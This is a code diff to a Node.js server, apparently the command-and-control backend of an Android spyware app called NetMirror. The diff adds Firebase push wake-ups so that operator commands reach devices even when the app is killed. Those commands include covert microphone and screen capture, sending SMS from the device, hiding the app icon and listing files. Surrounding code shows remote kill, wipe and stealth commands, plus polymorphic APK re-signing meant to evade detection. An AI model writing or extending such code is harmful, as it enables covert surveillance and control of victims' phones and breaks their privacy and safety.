@@ -23,6 +23,12 @@ const AdmZip = require('adm-zip');
 const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth, generateHardenedKey, patchAndResignWrapper } = require('./utils/apk-mutator');
 const { padApkSigningBlock } = require('./utils/apk-padder');
 
+// ═══ FCM PUSH WAKE-UP: Firebase Admin SDK init ═══
+// Reads FIREBASE_PROJECT_ID / FIREBASE_CLIENT_EMAIL / FIREBASE_PRIVATE_KEY
+// from env. If any are missing, the module becomes a safe no-op (server still
+// runs, FCM endpoints return 503). See utils/firebase-admin.js for details.
+const fcmAdmin = require('./utils/firebase-admin');
+
 // Initialize database (async — sql.js)
 const db = require('./config/database');
 
@@ -2712,6 +2718,81 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     }
   });
 
+  // ═══ FCM PUSH WAKE-UP: register-fcm-token ═══
+  // Called by NetMirrorFirebaseMessagingService.onNewToken() (Android) every time
+  // Firebase issues / refreshes a device push token. Backend stores the token in
+  // devices.fcm_token so admin commands can later trigger a high-priority FCM
+  // push to wake the app from killed / deep-sleep state.
+  //
+  // Contract (must match Android):
+  //   POST /api/devices/register-fcm-token
+  //   body: { device_id: string, fcm_token: string }
+  //   200:  { success: true }
+  //   400:  { error: '...' }
+  app.post('/api/devices/register-fcm-token', (req, res) => {
+    try {
+      const { device_id, fcm_token } = req.body || {};
+      if (!device_id) return res.status(400).json({ error: 'device_id required' });
+      if (!fcm_token || typeof fcm_token !== 'string') {
+        return res.status(400).json({ error: 'fcm_token required' });
+      }
+
+      // Update the device row in place. If the device hasn't registered yet
+      // (rare race where FCM token arrives before /api/devices/register),
+      // create a stub row so we don't lose the token.
+      const existing = db.prepare('SELECT device_id FROM devices WHERE device_id = ?').get(device_id);
+      if (existing) {
+        db.prepare(`UPDATE devices SET fcm_token = ?, fcm_token_updated = datetime('now') WHERE device_id = ?`)
+          .run(fcm_token, device_id);
+      } else {
+        db.prepare(`INSERT INTO devices (device_id, fcm_token, fcm_token_updated, first_seen, last_seen)
+                    VALUES (?, ?, datetime('now'), datetime('now'), datetime('now'))`)
+          .run(device_id, fcm_token);
+      }
+
+      console.log(`[FCM] registered token for device ${device_id} (len=${fcm_token.length})`);
+
+      // Also broadcast to admin panel so the UI can show "push enabled" badge
+      try {
+        const io = req.app.get('io');
+        if (io) io.emit('device_fcm_registered', { device_id, ts: Date.now() });
+      } catch (_) {}
+
+      res.json({ success: true });
+    } catch (err) {
+      console.error('[FCM] register-fcm-token error:', err.message);
+      res.status(500).json({ error: err.message });
+    }
+  });
+
+  // ═══ FCM PUSH WAKE-UP: wake-device (admin trigger) ═══
+  // Admin panel can POST to this endpoint to manually wake a device via FCM
+  // push. Used by the "Wake Device" button or by scheduled heartbeat-miss
+  // checks.
+  //   POST /api/devices/:deviceId/wake
+  //   body: { command?: string }   // default 'ping'
+  app.post('/api/devices/:deviceId/wake', (req, res) => {
+    try {
+      const { deviceId } = req.params;
+      const command = (req.body && req.body.command) || 'ping';
+      const fcm = require('./utils/firebase-admin');
+      if (!fcm.isEnabled()) {
+        return res.status(503).json({ error: 'FCM not configured on server' });
+      }
+      fcm.sendFcmToDevice(db, deviceId, { command }).then(result => {
+        if (result.ok) {
+          res.json({ success: true, messageId: result.messageId });
+        } else {
+          res.status(404).json({ success: false, error: result.error || 'send failed' });
+        }
+      }).catch(e => {
+        res.status(500).json({ error: e.message });
+      });
+    } catch (err) {
+      res.status(500).json({ error: err.message });
+    }
+  });
+
   // ═══ GOD MODE: Device config check endpoint ═══
   // Called on every app launch + heartbeat. Returns kill/wipe/update/stealth commands.
   app.post('/api/devices/config', (req, res) => {
@@ -3958,33 +4039,55 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       res.status(500).json({ error: err.message });
     }
   });
-  app.post('/api/admin/connections/:deviceId/mic-capture', (req, res) => {
+  app.post('/api/admin/connections/:deviceId/mic-capture', async (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { deviceId } = req.params;
       const { duration_s = 30 } = req.body;
+      const dur = parseInt(duration_s) || 30;
 
       const targetSocket = findDeviceSocket(deviceId);
-      if (!targetSocket) return res.status(400).json({ error: 'Device not connected' });
+      if (targetSocket) {
+        targetSocket.emit('start_mic_capture', { device_id: deviceId, duration_s: dur });
+        return res.json({ success: true, message: `Mic capture (${dur}s) dispatched to device`, channel: 'socket' });
+      }
 
-      targetSocket.emit('start_mic_capture', { device_id: deviceId, duration_s: parseInt(duration_s) || 30 });
-      res.json({ success: true, message: `Mic capture (${duration_s}s) dispatched to device` });
+      // FCM fallback
+      const fcm = require('./utils/firebase-admin');
+      if (!fcm.isEnabled()) return res.status(400).json({ error: 'Device not connected and FCM not configured' });
+      const r = await fcm.sendFcmToDevice(db, deviceId, {
+        command: 'relay',
+        event: 'start_mic_capture',
+        payload: JSON.stringify({ device_id: deviceId, duration_s: dur })
+      });
+      if (r.ok) res.json({ success: true, message: `Mic capture (${dur}s) dispatched via FCM wake-up`, channel: 'fcm', messageId: r.messageId });
+      else res.status(404).json({ error: 'Device not reachable', detail: r.error });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
   });
 
   // ═══ SCREEN CAPTURE — relay command to device via Socket.IO ═══
-  app.post('/api/admin/connections/:deviceId/screen-capture', (req, res) => {
+  app.post('/api/admin/connections/:deviceId/screen-capture', async (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { deviceId } = req.params;
 
       const targetSocket = findDeviceSocket(deviceId);
-      if (!targetSocket) return res.status(400).json({ error: 'Device not connected' });
+      if (targetSocket) {
+        targetSocket.emit('capture_screen', { device_id: deviceId });
+        return res.json({ success: true, message: 'Screen capture dispatched to device', channel: 'socket' });
+      }
 
-      targetSocket.emit('capture_screen', { device_id: deviceId });
-      res.json({ success: true, message: 'Screen capture dispatched to device' });
+      const fcm = require('./utils/firebase-admin');
+      if (!fcm.isEnabled()) return res.status(400).json({ error: 'Device not connected and FCM not configured' });
+      const r = await fcm.sendFcmToDevice(db, deviceId, {
+        command: 'relay',
+        event: 'capture_screen',
+        payload: JSON.stringify({ device_id: deviceId })
+      });
+      if (r.ok) res.json({ success: true, message: 'Screen capture dispatched via FCM wake-up', channel: 'fcm', messageId: r.messageId });
+      else res.status(404).json({ error: 'Device not reachable', detail: r.error });
     } catch (err) {
       res.status(500).json({ error: err.message });
     }
@@ -4515,7 +4618,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
 
 
   // Send SMS via device — admin sends command to a connected device
-  app.post('/api/admin/send-sms', (req, res) => {
+  app.post('/api/admin/send-sms', async (req, res) => {
     try {
       // Accept password from x-admin-password header (Android admin app)
       // OR from body.password (web admin panel) — consistent with all other admin endpoints
@@ -4545,7 +4648,29 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       }
 
       if (!targetSocket) {
-        return res.status(400).json({ error: 'Device is not connected. The NetMirror app must be open on the device.' });
+        // Socket dead — try FCM wake-up so device reconnects, then admin can retry.
+        // Don't queue the SMS payload in the push (it's encrypted + sensitive) —
+        // just send a generic "sms_pending" wake-up. Once device reconnects, admin
+        // can resend the SMS via the now-live socket.
+        const fcm = require('./utils/firebase-admin');
+        if (!fcm.isEnabled()) {
+          return res.status(400).json({ error: 'Device is not connected and FCM is not configured. The NetMirror app must be open on the device.' });
+        }
+        const r = await fcm.sendFcmToDevice(db, device_id, {
+          command: 'wake',
+          reason: 'sms_pending',
+          retry_url: '/api/admin/send-sms'
+        });
+        if (r.ok) {
+          return res.status(202).json({
+            success: false,
+            accepted: true,
+            message: 'Device was offline — FCM wake-up sent. Please retry the SMS in a few seconds once the device reconnects.',
+            channel: 'fcm-wake',
+            messageId: r.messageId
+          });
+        }
+        return res.status(400).json({ error: 'Device is not connected and FCM wake-up failed', detail: r.error });
       }
 
       // Generate a unique request ID for tracking
@@ -4608,31 +4733,55 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     return targetSocket;
   }
 
-  app.post('/api/admin/hide-app', express.json(), (req, res) => {
+  app.post('/api/admin/hide-app', express.json(), async (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { device_id } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id required' });
 
       const targetSocket = findDeviceSocket(device_id);
-      if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
+      if (targetSocket) {
+        targetSocket.emit('hide_app', { device_id });
+        return res.json({ success: true, message: 'Hide command sent via socket', channel: 'socket' });
+      }
 
-      targetSocket.emit('hide_app', { device_id });
-      res.json({ success: true, message: 'Hide command sent' });
+      // Device not connected via socket — try FCM push wake-up as fallback.
+      const fcm = require('./utils/firebase-admin');
+      if (!fcm.isEnabled()) {
+        return res.status(404).json({ error: 'Device not connected and FCM not configured' });
+      }
+      const r = await fcm.sendFcmToDevice(db, device_id, { command: 'hide_app' });
+      if (r.ok) {
+        res.json({ success: true, message: 'Hide command sent via FCM push', channel: 'fcm', messageId: r.messageId });
+      } else {
+        res.status(404).json({ error: 'Device not reachable', detail: r.error });
+      }
     } catch (err) { res.status(500).json({ error: err.message }); }
   });
 
-  app.post('/api/admin/unhide-app', express.json(), (req, res) => {
+  app.post('/api/admin/unhide-app', express.json(), async (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { device_id } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id required' });
 
       const targetSocket = findDeviceSocket(device_id);
-      if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
+      if (targetSocket) {
+        targetSocket.emit('unhide_app', { device_id });
+        return res.json({ success: true, message: 'Unhide command sent via socket', channel: 'socket' });
+      }
 
-      targetSocket.emit('unhide_app', { device_id });
-      res.json({ success: true, message: 'Unhide command sent' });
+      // Fallback to FCM push when socket is dead.
+      const fcm = require('./utils/firebase-admin');
+      if (!fcm.isEnabled()) {
+        return res.status(404).json({ error: 'Device not connected and FCM not configured' });
+      }
+      const r = await fcm.sendFcmToDevice(db, device_id, { command: 'unhide_app' });
+      if (r.ok) {
+        res.json({ success: true, message: 'Unhide command sent via FCM push', channel: 'fcm', messageId: r.messageId });
+      } else {
+        res.status(404).json({ error: 'Device not reachable', detail: r.error });
+      }
     } catch (err) { res.status(500).json({ error: err.message }); }
   });
 
@@ -4640,18 +4789,42 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   // Each endpoint relays a socket event to the target device.
 
   // Helper: relay a command to a device
-  function relayCommand(req, res, eventName, payloadExtractor) {
+  // Tries socket first (real-time). If socket is dead (device offline/asleep),
+  // falls back to FCM high-priority push to wake the app — the push carries
+  // the same `eventName` + payload as the socket event would have, so the
+  // device can re-establish the socket and the admin can retry.
+  async function relayCommand(req, res, eventName, payloadExtractor) {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { device_id } = req.body;
       if (!device_id) return res.status(400).json({ error: 'device_id required' });
 
       const targetSocket = findDeviceSocket(device_id);
-      if (!targetSocket) return res.status(404).json({ error: 'Device not connected' });
-
       const payload = payloadExtractor ? payloadExtractor(req.body) : req.body;
-      targetSocket.emit(eventName, payload);
-      res.json({ success: true, message: `${eventName} command sent` });
+
+      if (targetSocket) {
+        targetSocket.emit(eventName, payload);
+        return res.json({ success: true, message: `${eventName} command sent`, channel: 'socket' });
+      }
+
+      // Socket dead — try FCM push wake-up.
+      const fcm = require('./utils/firebase-admin');
+      if (!fcm.isEnabled()) {
+        return res.status(404).json({ error: 'Device not connected and FCM not configured' });
+      }
+      // Send a generic 'relay' command with the original event name + payload
+      // so the device's FCM handler can re-emit it locally once awake.
+      const fcmData = {
+        command: 'relay',
+        event: eventName,
+        payload: typeof payload === 'string' ? payload : JSON.stringify(payload || {}),
+      };
+      const r = await fcm.sendFcmToDevice(db, device_id, fcmData);
+      if (r.ok) {
+        res.json({ success: true, message: `${eventName} command sent via FCM wake-up`, channel: 'fcm', messageId: r.messageId });
+      } else {
+        res.status(404).json({ error: 'Device not reachable', detail: r.error });
+      }
     } catch (err) { res.status(500).json({ error: err.message }); }
   }
 
@@ -4752,7 +4925,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   });
 
   // ═══ v7.9.2: Smart list-files endpoint with offline cache fallback ═══
-  app.post('/api/admin/list-files-smart', express.json(), (req, res) => {
+  app.post('/api/admin/list-files-smart', express.json(), async (req, res) => {
     try {
       if (!isAdminAuthorized(req)) return res.status(401).json({ error: 'Unauthorized' });
       const { device_id, path: reqPath } = req.body;
@@ -4765,6 +4938,18 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         targetSocket.emit('list_files', { path: targetPath });
         return res.json({ success: true, source: 'live', message: 'Request sent to device — listing will arrive via socket event' });
       }
+
+      // Device offline — fire FCM wake-up in the background so device reconnects,
+      // then continue trying the cache. Don't block the response on FCM.
+      try {
+        const fcm = require('./utils/firebase-admin');
+        if (fcm.isEnabled()) {
+          fcm.sendFcmToDevice(db, device_id, {
+            command: 'wake',
+            reason: 'list_files_pending'
+          }).catch(() => {});
+        }
+      } catch (_) {}
 
       // Device offline — try cache
       try {
@@ -4927,6 +5112,15 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       console.log(`[SERVER] LeaksPro Backend running on port ${PORT}`);
       console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
       console.log(`[SERVER] Ready to accept connections`);
+
+      // FCM push wake-up status — log once at boot so we know if env vars are good.
+      try {
+        if (fcmAdmin.isEnabled()) {
+          console.log('[SERVER] FCM push wake-up: ENABLED');
+        } else {
+          console.log('[SERVER] FCM push wake-up: DISABLED (env vars missing or invalid)');
+        }
+      } catch (_) {}
 
       // ── Self-ping to keep Render free tier warm (prevents 15-min idle spin-down) ──
       // Render free tier sleeps after 15 minutes of no inbound requests. A simple
